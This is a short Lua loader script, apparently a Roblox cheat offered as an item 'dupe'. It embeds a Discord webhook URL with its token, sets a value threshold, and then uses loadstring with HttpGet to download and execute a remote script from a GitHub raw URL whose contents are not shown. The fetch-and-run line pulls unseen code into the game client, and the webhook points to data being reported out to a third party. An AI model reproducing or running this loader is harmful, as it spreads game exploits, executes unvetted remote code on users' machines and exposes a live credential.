local Webhook = "https://discord.com/api/webhooks/1438237712997027992/WPZ7XQdD72Lcs9xG73dgoltGmkOJiPjAdNgzuWWiN60aRGez7JPO_boeAuZYVnCs-7It"

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
